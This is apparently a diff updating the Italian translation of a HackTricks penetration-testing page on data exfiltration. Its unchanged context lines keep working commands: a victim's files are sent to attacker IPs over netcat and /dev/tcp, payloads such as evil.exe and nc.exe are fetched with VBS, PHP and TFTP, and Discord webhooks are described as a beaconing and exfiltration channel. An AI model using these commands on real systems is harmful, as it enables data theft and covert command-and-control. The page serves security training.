@@ -1,10 +1,17 @@
-# Exfiltration
+# Esfiltrazione
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Domini comunemente consentiti per l'esfiltrazione di informazioni
+> [!TIP]
+> Per un esempio end-to-end di staging del loot in `C:\Users\Public` e di esfiltrazione con Rclone per imitare backup legittimi, consulta il workflow seguente.
 
-Consulta [https://lots-project.com/](https://lots-project.com/) per trovare domini comunemente whitelistati che possono essere abusati
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
+## Domini comunemente inseriti nelle whitelist per esfiltrare informazioni
+
+Controlla [https://lots-project.com/](https://lots-project.com/) per trovare domini comunemente inseriti nelle whitelist che possono essere abusati
 
 ## Copy\&Paste Base64
 
@@ -42,7 +49,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Caricamento file
+### Caricare file
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -59,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **Server HTTPS**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -102,12 +109,12 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## Webhooks (Discord/Slack/Teams) per C2 & Data Exfiltration
 
-Webhooks sono endpoint HTTPS in sola scrittura che accettano JSON e parti file opzionali. Vengono comunemente autorizzati su domini SaaS attendibili e non richiedono OAuth/API keys, rendendoli utili per beaconing e exfiltration a basso attrito.
+I Webhooks sono endpoint HTTPS write-only che accettano JSON e parti file opzionali. Vengono comunemente autorizzati su trusted SaaS domains e non richiedono OAuth/API keys, rendendoli utili per low-friction beaconing e exfiltration.
 
-Punti chiave:
+Concetti chiave:
 - Endpoint: Discord usa https://discord.com/api/webhooks/<id>/<token>
 - POST multipart/form-data con una parte chiamata payload_json contenente {"content":"..."} e parti file opzionali chiamate file.
-- Pattern di loop dell'operatore: beacon periodico -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confermano la consegna.
+- Schema di loop dell'operatore: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confermano la consegna.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,7 +185,7 @@ Start-Sleep -Seconds 20
 }
 ```
 Note:
-- Schemi simili si applicano ad altre piattaforme di collaborazione (Slack/Teams) che usano i rispettivi incoming webhooks; adatta l'URL e lo schema JSON di conseguenza.
+- Analoghe modalità si applicano ad altre piattaforme di collaborazione (Slack/Teams) che usano i loro incoming webhooks; adegua URL e JSON schema di conseguenza.
 - Per DFIR degli artefatti della cache di Discord Desktop e per il recupero di webhook/API, vedi:
 
 {{#ref}}
@@ -260,13 +267,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-L'attaccante deve avere SSHd in esecuzione.
+L'attacker deve avere SSHd in esecuzione.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Se la victim ha SSH, the attacker può montare una directory della victim sul proprio sistema.
+Se la victim dispone di SSH, l'attacker può montare una directory dalla victim all'attacker.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -279,12 +286,12 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Scaricare file dalla vittima
+### Scaricare un file dalla vittima
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Caricare un file sulla vittima
+### Caricare file sulla vittima
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -319,7 +326,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Di default in XP e 2003 (in altri deve essere aggiunto esplicitamente durante l'installazione)
+Per impostazione predefinita in XP e 2003 (in altri sistemi deve essere aggiunto esplicitamente durante l'installazione)
 
 In Kali, **avvia il server TFTP**:
 ```bash
@@ -333,13 +340,13 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **vittima**, connettiti al server Kali:
+Nella **victim**, connettiti al server Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Scarica un file con un oneliner PHP:
+Scarica un file con un PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Il programma `debug.exe` non solo permette l'ispezione dei binaries ma ha anche la **capacità di ricostruirli da hex**. Ciò significa che, fornendo un hex di un binary, `debug.exe` può generare il file binary. Tuttavia, è importante notare che debug.exe ha una **limitazione nell'assemblare file fino a 64 kb di dimensione**.
+Il programma `debug.exe` non solo permette l'ispezione dei binari ma ha anche la **capacità di ricostruirli da hex**. Ciò significa che fornendo un hex di un binario, `debug.exe` può generare il file binario. Tuttavia, è importante notare che debug.exe ha una **limitazione nell'assemblare file di dimensione fino a 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Quindi copia e incolla il testo nella windows-shell e verrà creato un file chiamato nc.exe.
+Quindi copia e incolla il testo nel windows-shell e verrà creato un file chiamato nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
